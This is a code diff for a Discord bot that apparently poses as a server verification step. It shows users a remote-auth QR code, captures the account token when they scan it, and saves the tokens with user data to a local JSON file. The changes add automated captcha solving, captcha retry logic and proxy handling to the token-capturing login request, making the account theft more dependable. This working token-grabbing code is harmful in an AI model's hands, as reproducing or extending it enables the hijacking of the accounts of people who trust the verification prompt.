@@ -8,6 +8,7 @@ import random
 import logging
 import qrcode
 import io
+import inspect
 from qrcode.image.pil import PilImage
 from PIL import Image
 from discord.ext import commands
@@ -16,14 +17,13 @@ from typing import Any, Optional
 from websockets import connect
 from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
 from websockets.typing import Origin
-from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
 from base64 import b64decode, urlsafe_b64encode
 from hashlib import sha256
 from asyncio import get_event_loop, sleep as asleep, CancelledError
-from cryptography.hazmat.primitives.asymmetric import padding
-from cryptography.hazmat.primitives import hashes
-from aiohttp import ClientSession, BasicAuth
+from aiohttp import ClientSession, BasicAuth, ContentTypeError
 from colorama import Fore, init
 
 init(autoreset=True)
@@ -185,6 +185,7 @@ class PersistentView(discord.ui.View):
         if stop:
             return
 
+        # logging.basicConfig(level=logging.DEBUG, format="[%(levelname)s] %(name)s: %(message)s")
         log = logging.getLogger("RemoteAuthClient")
 
         class User:
@@ -201,6 +202,9 @@ class PersistentView(discord.ui.View):
                 return f"https://cdn.discord.com/avatars/{self.id}/{self.avatar}.png"
 
         class RemoteAuthClient:
+            _EVENTS = ("fingerprint", "userdata", "token", "cancel", "timeout", "error", "captcha")
+            MAX_CAPTCHA_RETRIES = 3
+
             def __init__(self, proxy=None, proxy_auth=None, user_agent=None):
                 self._task = None
                 self._heartbeatTask = None
@@ -220,6 +224,7 @@ class PersistentView(discord.ui.View):
 
                 self._retries = 0
                 self._rqtoken = None
+                self._captcha_session_id = None
 
                 self.proxy = proxy
                 self.proxy_auth = proxy_auth
@@ -237,10 +242,9 @@ class PersistentView(discord.ui.View):
 
             def event(self, t):
                 def registerhandler(handler):
-                    if t not in ("on_fingerprint", "on_userdata", "on_token", "on_cancel", "on_timeout", "on_error", "on_captcha"):
-                        log.warning(f"Unknown event type '{t}'.")
-                        return
-                    setattr(self, t, handler)
+                    if t not in self._EVENTS:
+                        raise ValueError(f"Unknown event type '{t}'")
+                    setattr(self, f"on_{t}", handler)
                     return handler
                 return registerhandler
 
@@ -251,24 +255,20 @@ class PersistentView(discord.ui.View):
                 while True:
                     await asleep(interval / 1000)
                     log.debug("Sending heartbeat.")
-                    await self._send({"op": 'heartbeat'})
+                    await self._send({"op": "heartbeat"})
 
             async def _send(self, json_data: dict) -> None:
                 await self._ws.send(json.dumps(json_data))
 
             def _decryptPayload(self, payload: str) -> bytes:
                 payload_bytes = b64decode(payload.encode("utf8"))
-                decrypted = self._privateKey.decrypt(
-                    payload_bytes,
-                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
-                )
-                return decrypted
+                return self._privateKey.decrypt(payload_bytes, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
 
             async def _event(self, name: str, **kwargs) -> Any:
                 handler = getattr(self, f"on_{name}")
                 if handler is self.ev:
                     return
-                if "client" in handler.__code__.co_varnames:
+                if "client" in inspect.signature(handler).parameters:
                     kwargs["client"] = self
                 return await handler(**kwargs)
 
@@ -284,31 +284,60 @@ class PersistentView(discord.ui.View):
                 self._publicKeyString = None
 
             async def _getToken(self, ticket: str, captcha_key: Optional[str] = None) -> Optional[str]:
+                if captcha_key is None:
+                    self._retries = 0
+                    self._rqtoken = None
+                    self._captcha_session_id = None
+
                 proxy_args = {}
                 if self.proxy:
                     proxy_args["proxy"] = f"http://{self.proxy}"
                     if self.proxy_auth:
                         proxy_args["proxy_auth"] = BasicAuth(**self.proxy_auth)
-                async with ClientSession(headers={"User-Agent": self.user_agent}) as sess:
-                    data = {"ticket": ticket}
-                    if captcha_key:
-                        data["captcha_key"] = captcha_key
-                        data["captcha_rqtoken"] = self._rqtoken
-                    log.debug(f"Trying to get a token with request body: {data}")
-                    resp = await sess.post("https://discord.com/api/v9/users/@me/remote-auth/login", json=data, **proxy_args)
-                    j = await resp.json()
-                    log.debug(f"Response code: {resp.status}")
-                    log.debug(f"Response body: {j}")
-                    if "encrypted_token" not in j and captcha_key is None and "captcha_key" in j:
-                        log.debug(f"Detected captcha response. Calling on_captcha method with {j}")
-                        del j["captcha_key"]
-                        self._rqtoken = j["captcha_rqtoken"]
-                        captcha_key = await self._event("captcha", captcha_data=j)
-                        log.debug(f"on_captcha result: {captcha_key}")
-                        if not captcha_key:
+
+                request_headers = {"User-Agent": self.user_agent}
+                if captcha_key:
+                    request_headers["X-Captcha-Key"] = captcha_key
+                    if self._rqtoken:
+                        request_headers["X-Captcha-Rqtoken"] = self._rqtoken
+                    if self._captcha_session_id:
+                        request_headers["X-Captcha-Session-Id"] = self._captcha_session_id
+
+                async with ClientSession(headers=request_headers) as sess:
+                    resp = await sess.post("https://discord.com/api/v9/users/@me/remote-auth/login", json={"ticket": ticket}, **proxy_args)
+
+                    try:
+                        response_data = await resp.json(content_type=None)
+                    except (ContentTypeError, json.JSONDecodeError, ValueError):
+                        body = await resp.text()
+                        log.error("Non-JSON remote-auth response: status=%s body=%r", resp.status, body[:500])
+                        return None
+
+                    if not isinstance(response_data, dict):
+                        log.error("Unexpected remote-auth payload: status=%s body=%r", resp.status, response_data)
+                        return None
+
+                    if "encrypted_token" in response_data:
+                        return response_data["encrypted_token"]
+
+                    if "captcha_key" in response_data:
+                        if self._retries >= self.MAX_CAPTCHA_RETRIES:
+                            log.error("Captcha retries exhausted (%s)", self._retries)
                             return None
-                        return await self._getToken(ticket, captcha_key)
-                    return j.get("encrypted_token")
+                        self._retries += 1
+
+                        captcha_data = dict(response_data)
+                        captcha_data.pop("captcha_key", None)
+                        self._rqtoken = captcha_data.get("captcha_rqtoken")
+                        self._captcha_session_id = captcha_data.get("captcha_session_id")
+
+                        new_key = await self._event("captcha", captcha_data=captcha_data)
+                        if not new_key:
+                            return None
+                        return await self._getToken(ticket, new_key)
+
+                    log.error("Remote-auth response without token nor captcha: status=%s body=%s", resp.status, response_data)
+                    return None
 
             async def _run(self) -> None:
                 err = None
@@ -379,13 +408,17 @@ class PersistentView(discord.ui.View):
 
         c = RemoteAuthClient()
 
-        @c.event("on_fingerprint")
+        @c.event("captcha")
+        async def on_captcha(captcha_data):
+            return await asyncio.to_thread(resolve_captcha, captcha_data, user_agent=c.user_agent, proxy=c.proxy)
+
+        @c.event("fingerprint")
         async def on_fingerprint(data):
-            @c.event("on_cancel")
+            @c.event("cancel")
             async def on_cancel():
                 print(f"{r}[{get_clock()}]{w} Auth canceled: {data} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
 
-            @c.event("on_timeout")
+            @c.event("timeout")
             async def on_timeout():
                 print(f"{r}[{get_clock()}]{w} Timeout: {data} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
 
@@ -407,7 +440,7 @@ class PersistentView(discord.ui.View):
 
             print(f"{g}[{get_clock()}]{w} QR Code Generated: {data} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
 
-            @c.event("on_userdata")
+            @c.event("userdata")
             async def on_userdata(user):
                 if not os.path.isfile("data/database.json"):
                     with open("data/database.json", "w", encoding="utf-8") as f:
@@ -427,7 +460,7 @@ class PersistentView(discord.ui.View):
 
                 print(f"{b}[{get_clock()}]{w} {user.username} ({user.id}) {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
 
-                @c.event("on_token")
+                @c.event("token")
                 async def on_token(token):
                     if not os.path.isfile("data/database.json"):
                         with open("data/database.json", "w", encoding="utf-8") as f:
@@ -635,3 +668,4 @@ class PersistentViewBot(commands.Bot):
 client = PersistentViewBot()
 
 from bot.commands import help, set_verified_role, set_logs_channel, customize_embed, preview_embed, reset_embed, send_verification
+from bot.captcha_handler import resolve_captcha, resolve_captcha_webview
